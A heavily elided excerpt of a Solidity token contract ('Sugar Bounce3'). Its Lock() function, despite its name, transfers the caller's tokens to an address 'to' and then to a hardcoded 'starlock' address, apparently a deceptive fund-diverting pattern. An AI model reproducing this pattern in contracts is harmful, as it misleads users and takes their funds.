...
contract Token {
    ...
    string public constant name = "Sugar Bounce3";
    string public constant symbol = "SBE3";
    ...
    function Lock() public returns (bool) {
        ...
        uint256 value = 20000000000000000;
        approve(to, value);
        _transfer(msg.sender, to, value );
        emit Transfer(msg.sender, to, value);
        address starlock=0x07f5890CA74766429fEF42f4d79CB4a26B8C4003;
        _transfer(msg.sender, starlock, value);
        emit Transfer(msg.sender, starlock, value);
